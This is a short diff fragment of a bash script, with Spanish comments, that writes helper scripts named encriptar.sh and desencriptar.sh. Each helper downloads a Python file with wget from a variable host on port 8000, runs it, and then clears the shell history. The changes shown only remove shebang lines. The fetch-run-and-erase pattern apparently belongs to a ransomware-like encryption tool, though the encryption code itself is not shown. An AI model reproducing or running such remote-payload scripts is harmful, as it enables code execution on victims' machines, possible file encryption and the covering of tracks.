@@ -20,7 +20,6 @@ while true; do
             
             # Crear el script datos.sh
             cat <<EOF > encriptar.sh
-#!/bin/bash
 wget http://$var:8000/py/encriptacion.py
 python3 encriptacion.py
 history -c
@@ -41,7 +40,6 @@ EOF
         
             # Crear el script desencriptar.sh
             cat <<EOF > desencriptar.sh
-#!/bin/bash
 wget http://$var:8000/py/desencriptar.py
 python3 desencriptar.py
 history -c
